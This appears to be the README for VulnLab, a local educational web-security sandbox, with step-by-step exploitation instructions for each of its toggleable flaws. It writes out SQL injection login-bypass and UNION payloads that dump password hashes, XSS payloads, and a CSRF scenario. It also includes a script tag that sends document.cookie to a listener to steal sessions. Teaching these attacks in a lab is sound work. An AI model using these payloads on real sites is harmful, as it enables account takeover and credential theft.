# VulnLab - Comprehensive Testing Guide

Welcome to **VulnLab**, an educational security sandbox designed to demonstrate common web application vulnerabilities, their root causes, and how to patch them.

This guide will walk you through installing the lab, running the server, and step-by-step instructions for exploiting every vulnerability included in the project.

## 🚀 Installation & Running Guide

### 1. Prerequisites
- Python 3.8+ installed on your system.

### 2. Setup Instructions
1. Open your terminal and navigate to the project folder (`d:\VulnLab`).
2. (Optional but recommended) Create and activate a virtual environment:
   ```bash
   python -m venv venv
   .\venv\Scripts\activate
   ```
3. Install the required dependencies:
   ```bash
   pip install -r requirements.txt
   ```
4. Start the application:
   ```bash
   python app.py
   ```
5. Open your web browser and navigate to: **`http://127.0.0.1:5000`**

### 3. Toggling Vulnerabilities
You can turn specific vulnerabilities on or off by editing the `VULN_MODE` dictionary inside `config.py`. 
- Set a flag to `True` to make the application vulnerable.
- Set a flag to `False` to apply the secure, patched code.
*(Note: You must restart the Flask server for configuration changes to take effect).*

---

## 🎯 Vulnerability Menu & Navigation Guide

| Page Name | Route | Vulnerability | Exploitation Script/Method |
|-----------|-------|---------------|----------------------------|
| [1. Login](#1-login-page--sql-injection-auth-bypass) | `/login` | SQLi (Auth Bypass) | Manual Payload |
| [2. Product Search](#2-product-search--sql-injection-union) | `/search` | SQLi (UNION Data Dump) | Manual Payload |
| [3. Guestbook Comments](#3-guestbook--stored-xss) | `/comments` | Stored XSS | Manual Payload |
| [4. Quick Search](#4-quick-search--reflected-xss) | `/search_reflected` | Reflected XSS | URL Manipulation |
| [5. Account Profile](#5-account-profile--csrf) | `/profile` | CSRF | `attacks/csrf_attack.html` |
| [6. Profile Picture](#6-profile-picture--insecure-file-upload) | `/upload` | Insecure File Upload | `attacks/upload_attack.py` |
| [7. Dashboard](#7-dashboard--session-hijacking--fixation) | `/dashboard` | Session Hijacking / Fixation | `attacks/session_hijack_theft.py` & `session_fixation.py` |
| [8. Admin WAF Dashboard](#8-admin-waf-dashboard) | `/admin/detections` | N/A (Blue Team Logs) | View live attacks here |

---

## 🧪 Step-by-Step Exploitation Guide

Ensure your server is running and `config.py` flags are set to `True` before testing!

### 1. Login Page — SQL Injection (Auth Bypass)
**How to Navigate:** Go to `http://127.0.0.1:5000/login`
- **The Attack:** We will trick the database into logging us in as the first user (Admin) without needing a password.
- **Username:** `' OR '1'='1' -- `
- **Password:** *[Leave blank or type anything]*
- **Result:** You are immediately logged into the Admin dashboard.

### 2. Product Search — SQL Injection (UNION)
**How to Navigate:** Go to `http://127.0.0.1:5000/search`
- **The Attack:** We will force the product search query to also dump the hidden `users` table.
- **Search Query:** `' UNION SELECT username, password_hash, 'x' FROM users -- `
- **Result:** The search results table will populate with the usernames and hashed passwords of all registered users.

### 3. Guestbook — Stored XSS
**How to Navigate:** Go to `http://127.0.0.1:5000/comments`
- **The Attack:** We will save a malicious script into the database so it executes for anyone who visits the page.
- **Name or Comment Field:** `<script>alert('Stored XSS Executed!')</script>`
- **Result:** An alert box pops up immediately. More importantly, if you refresh or if *another* user visits this page, the alert pops up for them too!

### 4. Quick Search — Reflected XSS
**How to Navigate:** You don't use the UI for this; you craft a malicious link!
- **The Attack:** We will embed a script directly into the URL query parameters.
- **Action:** Paste this exact URL into your browser: 
  `http://127.0.0.1:5000/search_reflected?query=<script>alert('Reflected XSS Executed!')</script>`
- **Result:** The script executes. Unlike Stored XSS, this is not saved in the database; it only affects the person who clicks this specific link.

### 5. Account Profile — CSRF
**How to Navigate:** Go to `http://127.0.0.1:5000/profile` and log in.
- **The Attack:** We will simulate a victim visiting an attacker's evil website, which forces their browser to change their VulnLab email address.
- **Action:** 
  1. Keep your VulnLab tab open and logged in.
  2. Open the file `d:\VulnLab\attacks\csrf_attack.html` directly in your browser (double-click it in your file explorer).
  3. The page claims you won an iPhone.
  4. Go back to your VulnLab tab and refresh the Profile page.
- **Result:** Your email address has been changed to `attacker@evil.com` without your permission!

### 6. Profile Picture — Insecure File Upload
**How to Navigate:** Go to `http://127.0.0.1:5000/upload`
- **The Attack:** We will upload a Python script disguised as an image to achieve Remote Code Execution.
- **Action:** Open a new terminal window and run our automated attack script:
  ```bash
  python attacks/upload_attack.py
  ```
- **Result:** The script automatically logs in, spoofs the HTTP headers, uploads `shell.py`, and proves it can access the malicious script directly from the public web server.

### 7. Dashboard — Session Hijacking & Fixation
**How to Navigate:** This involves terminal scripts and the Guestbook page.

**Part A: Session Hijacking (Cookie Theft)**
1. Open a new terminal and run: `python attacks/listener.py`
2. Go to the Guestbook (`/comments`) and post this XSS payload:
   `<script>fetch('http://127.0.0.1:9001/steal?c='+document.cookie)</script>`
3. Check your `listener.py` terminal. It will print your stolen session cookie! Copy it.
4. Open `attacks/session_hijack_theft.py`, paste your cookie on line 7, and save.
5. Run: `python attacks/session_hijack_theft.py`
6. **Result:** The script accesses the authenticated dashboard as you, without a password.

**Part B: Session Fixation**
1. Stop your Flask server and restart it to clear your session.
2. Run the automated script: `python attacks/session_fixation.py`
3. **Result:** The script automatically sets a known session ID, simulates the victim logging in, and proves the attacker can now use that known session ID to access the victim's account.

### 8. Admin WAF Dashboard
**How to Navigate:** Go to `http://127.0.0.1:5000/admin/detections`
- **The Defense:** This page is the "Blue Team" view. Leave this page open in one tab while you perform the attacks above in another tab.
- **Result:** The dashboard will automatically refresh every 3 seconds, logging the exact timestamps, IP addresses, and payloads of the attacks you are executing against the server!
